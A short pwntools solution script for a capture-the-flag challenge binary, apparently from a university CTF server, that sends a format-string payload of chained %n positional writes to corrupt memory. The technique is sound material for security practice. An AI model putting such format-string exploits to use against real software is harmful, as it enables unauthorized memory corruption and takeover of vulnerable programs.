from pwn import *
import struct

BINARY = ['./soal.out']
IP, PORT = 'ctf99.cs.ui.ac.id', 10009
LOCAL = True
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+81
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
if not LOCAL:
    print(p.recv())  # Weird behaviour from the server

print(p.recv().decode())
payload = b'%10c%4$n'
payload += b'%1$5c%5$n'  # 1$ to fix weird behaviour with chaining format strings
payload += b'%1$15c%2$n'
payload += b'%1$15c%1$n'
payload += b'A%3$n'  # one padding acts weird, subtitute with literal char
print(payload)
p.sendline(payload)
sleep(1)
print(p.recv().decode(errors='ignore'))
